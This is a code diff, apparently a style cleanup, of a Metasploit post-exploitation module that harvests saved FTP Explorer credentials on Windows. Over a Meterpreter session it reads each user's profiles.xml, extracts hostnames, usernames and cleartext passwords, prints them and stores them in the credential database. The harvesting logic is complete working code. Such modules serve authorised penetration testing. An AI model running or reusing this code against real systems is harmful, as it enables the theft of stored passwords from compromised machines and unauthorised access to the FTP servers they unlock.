@@ -1,8 +1,8 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
-
 
 require 'msf/core'
 require 'rex'
@@ -11,28 +11,25 @@ require 'rexml/document'
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Gather FTP Explorer (FTPX) Credential Extraction',
-      'Description'   => %q{
-        This module finds saved login credentials for the FTP Explorer (FTPx)
-        FTP client for Windows.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather FTP Explorer (FTPX) Credential Extraction',
+                      'Description'   => %q{
+                        This module finds saved login credentials for the FTP Explorer (FTPx)
+                        FTP client for Windows.
+                      },
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [ 'Brendan Coles <bcoles[at]gmail.com>' ],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
   end
 
   def run
-    grab_user_profiles().each do |user|
+    grab_user_profiles.each do |user|
       next if user['AppData'].nil?
 
       xml = get_xml(user['AppData'] + "\\FTP Explorer\\profiles.xml")
-      unless xml.nil?
-        parse_xml(xml)
-      end
+      parse_xml(xml) unless xml.nil?
     end
   end
 
@@ -41,9 +38,7 @@ class MetasploitModule < Msf::Post
       connections = client.fs.file.new(path, 'r')
 
       condata = ''
-      until connections.eof
-        condata << connections.read
-      end
+      condata << connections.read until connections.eof
       return condata
     rescue Rex::Post::Meterpreter::RequestError => e
       print_error "Error when reading #{path} (#{e.message})"
@@ -66,7 +61,7 @@ class MetasploitModule < Msf::Post
       pass = node.elements['Password'].text
 
       # skip blank passwords
-      next if !pass or pass.empty?
+      next if !pass || pass.empty?
 
       # show results to the user
       print_good("#{session.sock.peerhost}:#{port} (#{host}) - '#{user}:#{pass}'")
@@ -83,7 +78,7 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         username: user,
         private_data: pass,
         private_type: :password
@@ -100,5 +95,4 @@ class MetasploitModule < Msf::Post
       create_credential_login(login_data.merge(service_data))
     end
   end
-
 end
